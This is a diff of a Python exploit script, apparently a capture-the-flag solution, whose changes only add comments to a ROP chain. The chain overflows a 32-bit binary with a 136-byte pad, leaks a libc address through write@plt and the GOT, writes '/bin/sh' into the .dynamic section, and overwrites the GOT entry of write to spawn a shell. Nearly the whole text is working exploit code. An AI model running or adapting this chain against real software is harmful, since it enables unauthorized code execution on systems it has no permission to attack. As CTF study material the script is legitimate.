@@ -28,21 +28,21 @@ raw_input()
 pad='A'*136+"BBBB"
 #leak __libc_start_main : write GOT[__libc_start_main]=0x8049618 to stdout=1
 payload=pad
-payload+=p32(0x804830c)
+payload+=p32(0x804830c) # write_plt
 payload+=p32(0x080484b6)#pop pop pop ret to keep stack clean
 payload+=p32(1)
 payload+=p32(0x8049618)
 payload+=p32(4)
 
 #read /bin/sh to 0x8049530 .dynamic      000000d0  08049530  08049530
-payload+=p32(0x804832c)
+payload+=p32(0x804832c) # read_plt
 payload+=p32(0x080484b6)#pop pop pop ret to keep stack clean
 payload+=p32(0)
-payload+=p32(0x8049530)
+payload+=p32(0x8049530) #dynamic
 payload+=p32(7)
 
 #read address from stdin=0 to GOT[write]
-payload+=p32(0x804832c)
+payload+=p32(0x804832c) #real_plt
 payload+=p32(0x080484b6)#pop pop pop ret to keep stack clean
 payload+=p32(0)
 payload+=p32(0x08049614)
@@ -50,7 +50,7 @@ payload+=p32(4)
 
 payload+=p32(0x804830c)
 payload+=p32(0x080484b6)#pop pop pop ret to keep stack clean
-payload+=p32(0x8049530)
+payload+=p32(0x8049530) #dynamic
 s.sendline(payload)
 
 libc_leak=u32(s.recv(4))
